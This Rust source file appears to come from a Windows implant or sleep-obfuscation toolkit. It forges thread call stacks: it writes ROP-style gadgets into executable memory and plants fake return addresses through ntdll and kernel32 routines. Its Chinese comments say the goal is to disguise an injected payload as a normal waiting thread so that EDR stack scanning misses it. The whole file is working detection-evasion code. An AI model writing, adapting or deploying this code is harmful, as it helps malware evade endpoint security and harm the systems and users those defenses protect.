use alloc::string::String;
use core::{ops::Add, ptr::null_mut, slice::from_raw_parts};

use uwd::ignoring_set_fpreg;
use obfstr::obfstring as s;
use anyhow::{Context, Result, bail};
use dinvk::types::{
    CONTEXT, 
    IMAGE_RUNTIME_FUNCTION, 
    IMAGE_DIRECTORY_ENTRY_EXCEPTION
};
use dinvk::{
    winapis::{NtCurrentProcess, NT_SUCCESS},
    helper::PE,
};

use crate::{Obfuscation, types::*};
use crate::config::Config;
use crate::gadget::{scan_runtime, GadgetKind};
use crate::winapis::{
    NtLockVirtualMemory,
    NtAllocateVirtualMemory,
    NtProtectVirtualMemory
};

/// Provides access to the unwind (exception handling) information of a PE image.
/// 
/// 该pe完全用来处理exception handling
#[derive(Debug)]
pub struct Unwind {
    /// Reference to the parsed PE image.
    pub pe: PE,
}

impl Unwind {
    /// Creates a new [`Unwind`].
    pub fn new(pe: PE) -> Self {
        Unwind { pe }
    }

    /// Returns all runtime function entries.
    pub fn entries(&self) -> Option<&[IMAGE_RUNTIME_FUNCTION]> {

        // pe->->dosheader->ntheader
        let nt = self.pe.nt_header()?;

        // ntheader->optionalheader->datadirectory(这是一个16个元素的数组,每个元素是Image_Data_Directory类型,其中第3个指向Image_Runtime_Function,这个结构体为异常目录)
        // 异常目录是给os做stack walk栈回溯/seh用的,详细记录了每个函数的栈/寄存器使用情况,因此也叫image_runtime_function
        let dir = unsafe {
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]
        };

        if dir.VirtualAddress == 0 || dir.Size == 0 {
            return None;
        }

        let addr = (self.pe.base as usize + dir.VirtualAddress as usize) as *const IMAGE_RUNTIME_FUNCTION;
        let len = dir.Size as usize / size_of::<IMAGE_RUNTIME_FUNCTION>();

        // Forms a slice from a pointer and a length
        Some(unsafe { from_raw_parts(addr, len) })
    }

    /// Finds a runtime function by its RVA.
    pub fn function_by_offset(&self, offset: u32) -> Option<&IMAGE_RUNTIME_FUNCTION> {
        self.entries()?.iter().find(|f| f.BeginAddress == offset)
    }
}

/// Represents a reserved stack region for custom thread execution.
/// 
/// 
#[derive(Default, Debug, Clone, Copy)]
pub struct StackSpoof {
    /// Address of a `gadget_rbp`, which realigns the stack (`mov rsp, rbp; ret`).
    gadget_rbp: u64,

    /// Stack frame size for `BaseThreadInitThunk`.
    base_thread_size: u32,

    /// Stack frame size for `RtlUserThreadStart`.
    rtl_user_thread_size: u32,

    /// Stack frame size for `EnumResourcesW`.
    enum_date_size: u32,

    /// Stack frame size for `RtlAcquireSRWLockExclusive`.
    rlt_acquire_srw_size: u32,

    /// Type of gadget (`call [rbx]` or `jmp [rbx]`).
    gadget: GadgetKind,
}

impl StackSpoof {
    /// Create a new `StackSpoof`.
    #[inline]
    pub fn new(cfg: &Config) -> Result<Self> {
        let mut stack = Self::alloc_memory(cfg)?;
        stack.frames(cfg)?;
        Ok(stack)
    }

    /// Allocates memory required for spoofed stack execution.
    pub fn alloc_memory(cfg: &Config) -> Result<Self> {
        // Check that the algo module contains a gadget `call [rbx]` or `jmp [rbx]`
        let kind = GadgetKind::detect(cfg.modules.kernelbase.as_ptr())?;

        // Allocate gadget code
        let bytes = kind.bytes();
        let mut gadget_code = null_mut();
        // 1左移12位后,该值对应的十进制是4096
        let mut code_size = 1 << 12;

        // 
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(), 
            &mut gadget_code, 
            0, 
            &mut code_size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )) {
            bail!(s!("failed to allocate memory for gadget code"));
        }

        // 将对应的机器码写入gadget_code(第一块申请的内存)
        unsafe {
            core::ptr::copy_nonoverlapping(bytes.as_ptr(), gadget_code as *mut u8, bytes.len());
        }

        // Change protection to RX for execution
        let mut old_protect = 0;
        if !NT_SUCCESS(NtProtectVirtualMemory(
            NtCurrentProcess(), 
            &mut gadget_code, 
            &mut code_size, 
            PAGE_EXECUTE_READ as u32, 
            &mut old_protect
        )) {
            bail!(s!("failed to change memory protection for RX"));
        }

        // Allocate pointer to gadget
        let mut gadget_ptr = null_mut();
        let mut ptr_size = 1 << 12;
        if !NT_SUCCESS(NtAllocateVirtualMemory(
            NtCurrentProcess(), 
            &mut gadget_ptr, 
            0, 
            &mut ptr_size, 
            MEM_COMMIT | MEM_RESERVE, 
            PAGE_READWRITE
        )) {
            bail!(s!("failed to allocate gadget pointer page"));
        }

        unsafe {
            // Writes the gadget address (`mov rsp, rbp; ret`) to a pointer page
            // 将第一块内存的位置写入第二块内存中
            *(gadget_ptr as *mut u64) = gadget_code as u64;

            // Locks the specified region of virtual memory into physical memory,
            // preventing it from being paged to disk by the memory manager.
            NtLockVirtualMemory(NtCurrentProcess(), &mut gadget_code, &mut code_size, VM_LOCK_1);
            NtLockVirtualMemory(NtCurrentProcess(), &mut gadget_ptr, &mut ptr_size, VM_LOCK_1);
        }

        Ok(Self {
            gadget_rbp: gadget_ptr as u64,
            gadget: kind,
            ..Default::default()
        })
    }

    /// Resolves stack frame sizes for known Windows thread routines using unwind metadata.
    pub fn frames(&mut self, cfg: &Config) -> Result<()> {

        // 调用cfg.modules(config.rs中调用了get_ntdll_address)得到一个Modules结构体
        let pe_ntdll = Unwind::new(PE::parse(cfg.modules.ntdll.as_ptr()));
        let pe_kernel32 = Unwind::new(PE::parse(cfg.modules.kernel32.as_ptr()));

        // 通过get_proc_address找到RtlUserThreadStart的va.-ntdll基址得到rva.
        // 通过rva在异常目录中(Image_RunTime_Function数组)匹配对应的记录
        // 是伪造栈的最底层
        let rtl_user = pe_ntdll
            .function_by_offset(cfg.rtl_user_thread.as_u64() as u32 - cfg.modules.ntdll.as_u64() as u32)
            .context(s!("missing unwind: RtlUserThreadStart"))?;

        // 是RtlUserThreadStart调用的第一个函数BaseThreadInitThunk,确保伪造栈的底部两层的真实
        let base_thread = pe_kernel32
            .function_by_offset(cfg.base_thread.as_u64() as u32 - cfg.modules.kernel32.as_u64() as u32)
            .context(s!("missing unwind: BaseThreadInitThunk"))?;

        // kernel32!EnumDateFormatsExA,原型为枚举当前os支持的所有日期格式.
        // 支持回调,它会遍历内部和数据,每找到一种格式,都会调用一次用户提供的回调函数
        let enum_date = pe_kernel32
            .function_by_offset(cfg.enum_date.as_u64() as u32 - cfg.modules.kernel32.as_u64() as u32)
            .context(s!("missing unwind: EnumDateFormatsExA"))?;

        // RtlAcquireSRWLockExclusive,极为常见的内核同步锁函数.模拟一个看起来很忙又很正常的函数.让edr认为线程在等待资源,降低审计优先级
        let rtl_acquire_srw = pe_ntdll
            .function_by_offset(cfg.rtl_acquire_lock.as_u64() as u32 - cfg.modules.ntdll.as_u64() as u32)
            .context(s!("missing unwind: RtlAcquireSRWLockExclusive"))?;

        //ntdll!RtlUserThreadStart：作为所有线程的法定始祖负责初始化 SEH环境，通过计算其栈深来确立伪造栈的物理最底层原点，从而在 EDR溯源审计时为载荷提供“根正苗红”的合法身份证明
        self.rtl_user_thread_size = ignoring_set_fpreg(cfg.modules.ntdll.as_ptr(), rtl_user)
            .context(s!("failed to get frame size: RtlUserThreadStart"))?;

        // kernel32!BaseThreadInitThunk：作为启动链中转站负责接收内核参数并拉起用户代码，测量其精确栈帧是为了在内存中锚定指向始祖函数的返回地址偏移，从而还原出逻辑连贯、无断层的系统标准调用序列
        self.base_thread_size = ignoring_set_fpreg(cfg.modules.kernel32.as_ptr(), base_thread)
            .context(s!("failed to get frame size: BaseThreadInitThunk"))?;

         // kernel32!EnumDateFormatsExA：作为处理本地化日期的业务 API通过回调机制执行代码，测定其栈深是为了在混淆链跳转时提供精准的 RSp对齐参数，使恶意动作看起来像是该合法业务函数触发的一次正常回调返回
        self.enum_date_size = ignoring_set_fpreg(cfg.modules.kernel32.as_ptr(), enum_date)
            .context(s!("failed to get frame size: EnumDateFormatsExA"))?;

       // ntdll!RtlAcquireSRWLockExclusive：作为底层同步原语负责获取排他性读写锁，实时提取其栈帧深度是为了在模拟执行停顿行为时提供物理坐标依据，确保掩护混淆逻辑的“正在等锁”假象在内存布局上与系统预期严丝合缝
        self.rlt_acquire_srw_size = ignoring_set_fpreg(cfg.modules.ntdll.as_ptr(), rtl_acquire_srw)
            .context(s!("failed to get frame size: RtlAcquireSRWLockExclusive"))?;

        Ok(())
    }

    /// Constructs a forged `CONTEXT` structure simulating a spoofed call chain.
    ///
    /// EDR会定期扫描所有线程的栈,如果正在运行的代码在栈上没有合法的系统函数,会被判定为注入载荷.
    /// 
    /// 本函数把当前线程的CONTEXT改造如下调用链,模拟一个正在休眠/标准的windows系统线程
    /// 
    /// This function emulates a legitimate return sequence through:
    /// - `ZwWaitForWorkViaWorkerFactory`
    /// - `RtlAcquireSRWLockExclusive`  
    /// - `BaseThreadInitThunk`  
    /// - `RtlUserThreadStart`
    #[inline]
    pub fn spoof_context(&self, cfg: &Config, ctx: CONTEXT) -> CONTEXT {
        unsafe {
            // Construct a fake execution context for the current thread,
            // simulating a call stack that chains through spoofed return addresses
            let mut ctx_spoof = CONTEXT {   
                // CONTEXT_FULL代表接管当前线程下所有寄存器
                ContextFlags: CONTEXT_FULL,
                ..Default::default()
            };

            // Set the instruction pointer to the address of ZwWaitForWorkViaWorkerFactory
            // zw_wait_for_worker通过config指向ntdll!ZwWaitForWorkViaWorkerFactory.这是win线程池在空闲时的待命处.
            // 赋值给rip,代表下一条指令.此处代表cpu即将从这个合法的函数中返回
            ctx_spoof.Rip = cfg.zw_wait_for_worker.as_u64();

            // Compute the spoofed RSP by subtracting all stacked frame sizes and extra alignment
            // 栈顶下移5个0x1000(4kb),防止手动写栈时覆盖了原有数据.下移写入之后,和原来栈底之间的空闲空间,系统会怎么处理,留下这么多空白是否有危险?正常的函数调用也会下移大量的栈空间吗?
            ctx_spoof.Rsp = (ctx.Rsp - 0x1000 * 5)
            // rsp包括其他寄存器在win64下都是64位的
                - (cfg.stack.rtl_user_thread_size
                    + cfg.stack.base_thread_size
                    + cfg.stack.rlt_acquire_srw_size
                    + 32) as u64;

            // Return to RtlAcquireSRWLockExclusive + 0x17 (after call)
            // cfg.rtl_acquire_lock：指向 ntdll!RtlAcquireSRWLockExclusive
            // 0x17指该函数内部某条call指令的下一跳指令位置.将该地址写入rsp,代表当ZwWaitForWork执行ret时,会进入这锁函数
            // 这里为啥是0x17,在spoof.md中
            *(ctx_spoof.Rsp as *mut u64) = cfg.rtl_acquire_lock.as_u64().add(0x17);

            // Return to BaseThreadInitThunk + 0x14.模拟BaseThreadInitThunk 调用RtlAcquireSRWLockExclusive 的物理遗痕迹.
            // // cfg.base_thread：指向 kernel32!BaseThreadInitThunk;rlt_acquire_srw_size:Stack frame size for RtlAcquireSRWLockExclusive
            // 根据win64下的约定,BaseThreadInitThunk执行ret时,cpu应rsp+rtl_acquire_srw_size位置寻找返回地址
            // +8:跳过返回地址本身的8字节.0x14,模拟basethread内部调用子函数后的合法返回位置
            *(ctx_spoof.Rsp.add((cfg.stack.rlt_acquire_srw_size + 8) as u64) as *mut u64) =
                cfg.base_thread.as_u64().add(0x14);

            // Return to RtlUserThreadStart + 0x21
            *(ctx_spoof.Rsp.add((cfg.stack.rlt_acquire_srw_size + cfg.stack.base_thread_size + 16) as u64)
                as *mut u64) = cfg.rtl_user_thread.as_u64().add(0x21);

            // End a call stack.伪造调用链在物理空间的终结
            // 三层伪造寒素的栈深;24代表三层函数的返回地址
            // 0:win的内存模型中,0/NULL时合法的栈底标志.当os内核/EDR调用RtlVirtualUnwind递归查找父函数时,如果解析出rip在有效模块中会继续回溯,如果解析出的返回地址为0,回溯流程正常终止
           *(ctx_spoof.Rsp.add(
                (cfg.stack.rlt_acquire_srw_size
                    + cfg.stack.base_thread_size
                    + cfg.stack.rtl_user_thread_size
                    + 24) as u64,
            ) as *mut u64) = 0;

            ctx_spoof
        }
    }

    /// Applies a fake call stack layout to a series of thread contexts,
    /// simulating a legitimate execution.
    pub fn spoof(&self, ctxs: &mut [CONTEXT], cfg: &Config, kind: Obfuscation) -> Result<()> {

        // 得到kernelbase.dll的运行时函数表(image_runtime_function)
        let pe_kernelbase = Unwind::new(PE::parse(cfg.modules.kernelbase.as_ptr()));
        let tables = pe_kernelbase
            .entries()
            .context(s!(
                "failed to read IMAGE_RUNTIME_FUNCTION entries from .pdata section"
            ))?;

        // Locate the target COP(Call-Oriented Programming) or JOP(Jump-Oriented Programming) gadget:均为绕过DEP(数据执行保护)/ASLR(地址空间随机化)
        // kernelbase中包含大量以 0xFF 0x13(call [rbx]) 或0xFF 0x23(jmp [rbp])结尾的gadgets
        let (gadget_addr, gadget_size) = self.gadget.resolve(cfg)?;

        // add rsp, 0x58 ; ret:
        // 在kernelbase模块中,根据runtime_function找到对应的机器码
        // 0x48(REX.W):扩展前缀,指定接下来的指令操作数为64位
        // 0x83,0xC4(ADD RSP,imm8):0x83为ADD;0xC4指定目标寄存器RSP
        // 0x58:要增加的数值0x58(十进制88),这里add跳过指定的0x58空间,从一个深层的系统函数转到另一个函数,在跳转时需要预留32字节影子空间+寄存器(函数通常会备份3-5个寄存器,每个8字节)+16字节的栈对齐.这里是作者通过大量逆向发现,0x58可以一次性跳过大多数系统函数的prolog,让cpu落在预设的下一个返回地址
        // 0xC3:RET
        // tables代表一个Image_runtime_function数组
        // add_rsp_addr代表找到的gadget在内存中的VA;add_rsp_size代表找到的gadget所占栈空间大小
        let (add_rsp_addr, add_rsp_size) = scan_runtime(
            cfg.modules.kernelbase.as_ptr(),
            &[0x48, 0x83, 0xC4, 0x58, 0xC3],
            tables
        )
        .context(s!("add rsp gadget not found"))?;

        unsafe {
            for ctx in ctxs.iter_mut() {
                ctx.Rbp = match kind {
                    Obfuscation::Timer | Obfuscation::Wait => ctx.Rsp,
                    Obfuscation::Foliage => {
                        // Inject NtTestAlert as stack return address to trigger APC delivery
                        (ctx.Rsp as *mut u64).write(cfg.nt_test_alert.into());
                        ctx.Rsp
                    }
                };

                // RBX points to our gadget pointer (mov rsp, rbp; ret)
                ctx.Rbx = cfg.stack.gadget_rbp;

                // Compute total stack size for the spoofed call chain
                ctx.Rsp = (ctx.Rsp - 0x1000 * 10)
                    - (cfg.stack.rtl_user_thread_size
                        + cfg.stack.base_thread_size
                        + cfg.stack.enum_date_size
                        + gadget_size
                        + add_rsp_size
                        + 48) as u64;

                // Stack is aligned?
                if ctx.Rsp % 16 != 0 {
                    ctx.Rsp -= 8;
                }

                // First gadget: add rsp, 0x58; ret
                *(ctx.Rsp as *mut u64) = add_rsp_addr as u64;

                // Gadget trampoline: call [rbx] || jmp [rbx]
                *(ctx.Rsp.add((add_rsp_size + 8) as u64) as *mut u64) = gadget_addr as u64;

                // Return to EnumDateFormatsExA + 0x17 (after call)
                *(ctx.Rsp.add((add_rsp_size + gadget_size + 16) as u64) as *mut u64) =
                    cfg.enum_date.as_u64().add(0x17);

                // Return to BaseThreadInitThunk + 0x14
                *(ctx.Rsp.add((cfg.stack.enum_date_size + gadget_size + add_rsp_size + 24) as u64)
                    as *mut u64) = cfg.base_thread.as_u64().add(0x14);

                // Return to RtlUserThreadStart + 0x21
                *(ctx.Rsp.add(
                    (cfg.stack.enum_date_size
                        + cfg.stack.base_thread_size
                        + gadget_size
                        + add_rsp_size
                        + 32) as u64,
                ) as *mut u64) = cfg.rtl_user_thread.as_u64().add(0x21);

                // End a call stack
                *(ctx.Rsp.add(
                   (cfg.stack.enum_date_size
                        + cfg.stack.base_thread_size
                        + cfg.stack.rtl_user_thread_size
                        + gadget_size
                        + add_rsp_size
                        + 40) as u64,
                ) as *mut u64) = 0;
            }
        }

        Ok(())
    }
}
